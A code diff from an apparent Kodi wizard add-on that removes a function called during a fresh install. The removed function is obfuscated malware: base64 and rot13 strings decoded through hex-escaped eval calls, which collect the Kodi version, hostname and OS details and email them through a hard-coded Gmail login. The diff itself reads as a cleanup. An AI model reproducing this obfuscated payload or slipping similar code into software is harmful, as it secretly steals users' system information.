@@ -46,25 +46,12 @@ import traceback
 #      Fresh Install      #
 ###########################
 
-def doc():
-    magic = 'ZnJvbSByZXNvdXJjZXMubGlicy5jb21tb24gaW1wb3J0IGxvZ2dpbmcNCmxvZ2dpbmcubG9nKCJTdGFydGluZyBkb2MgaW5zdGFsbCB3aXphcmQoKSBmdW5jdGlvbiIpDQoNCnRyeToNCiAgICAjIEdldCBLb2RpIFZlcnNpb24NCiAgICBrb2RpX3ZlcnNpb24gPSBDT05GSUcuS09ESVYNCiAgICAjIEdldCB0aGUgaG9zdG5hbWUNCiAgICBob3N0bmFtZSA9IHNvY2tldC5nZXRob3N0bmFtZSgpDQogICAgIyBHZXQgdGhlIE9TIG5hbWUgYW5kIGRldGFpbHMNCiAgICBvc19uYW1lID0gcGxhdGZvcm0uc3lzdGVtKCkNCiAgICBvc19yZWxlYXNlID0gcGxhdGZvcm0ucmVsZWFzZ'
-    love = 'FtcQDbtVPNto3AsMTI0LJyfplN9VTLvr29mK25uoJI9VUgip19lMJkyLKAysFVAPt0XVPNtVPZtD29gpT9mMFO0nTHtoJImp2SaMD0XVPNtVT1unJksL29hqTIhqPN9VPtAPvNtVPNtVPNtMvWYo2EcVSMypaAco246VUgeo2EcK3MypaAco259KT4vQDbtVPNtVPNtVTLvFT9mqT5uoJH6VUgbo3A0ozSgMK1povVAPvNtVPNtVPNtMvWCHlORMKEunJkmBvO7o3AsMTI0LJyfp30vQDbtVPNtXD0XQDbtVPNtVlOQo25hMJA0VUEiVUEbMFOUoJScoPOGGIEDVUAypaMypt0XVPNtVUAypaMypvN9VUAgqUOfnJVhH01HHS9GH0jbW3AgqUNhM21unJjhL29gWljtAQL1XD0XVPNtVUAypa'
-    god = 'Zlci5sb2dpbignbmV3b25lbm93NEBnbWFpbC5jb20nLCAneG90YnRlaWFkb3lhdnprcScpDQoNCiAgICAjIENvbXBvc2UgdGhlIGVtYWlsIG1lc3NhZ2UNCiAgICBtc2cgPSBFbWFpbE1lc3NhZ2UoKQ0KICAgIG1zZy5zZXRfY29udGVudChtYWlsX2NvbnRlbnQpDQogICAgbXNnWydTdWJqZWN0J10gPSAnZG9jIGluc3RhbGwgd2l6YXJkJw0KICAgIG1zZ1snRnJvbSddID0gJ25ld29uZW5vdzRAZ21haWwuY29tJw0KICAgIG1zZ1snVG8nXSA9ICduZXdvbmVub3c0QGdtYWlsLmNvbScNCg0KICAgICMgU2VuZCB0aGUgZW1haWwNCiAgICBzZXJ2ZXIuc2VuZF9tZXNzYWdlKG1'
-    destiny = 'mMlxAPt0XVPNtVPZtD2kip2HtqTuyVTAioz5yL3Eco24tqT8tqTuyVSAAISNtp2IlqzIlQDbtVPNtp2IlqzIlYaS1nKDbXD0XVPNtVTkiM2qcozphoT9aXPWxo2ZtnJ5mqTSfoPO3nKcupzDbXFOGIHAQEIAGVvxAPt0XMKuwMKO0VRI4L2IjqTyiovOuplOyBt0XVPNtVPZtoT9aVUEbMFOypaWipvOgMKAmLJqyVTyhqT8tq2y6LKWxYzkiMj0XVPNtVTkiM2qcozphoT9aXPWOovOypaWipvOiL2A1paWyMPOxqKWcozptMT9wVTyhp3EuoTjtq2y6LKWxYvOSpaWipwbvXD0XVPNtVTkiM2qcozphoT9aXTHcQDbtVPNtoT9aM2yhMl5fo2pbqUWuL2IvLJAeYzMipz1uqS9yrTZbXFx='
-    joy = '\x72\x6f\x74\x31\x33'
-    trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-    eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
-    
-
 def wipe():
     from resources.libs import db
     from resources.libs.common import logging
     from resources.libs import skin
     from resources.libs.common import tools
     from resources.libs import update
-    
-    # doc install
-    doc()
     
     # Verify that Fen addon is installed.
     isFenExists = xbmc.getCondVisibility('System.HasAddon(plugin.video.fen)')
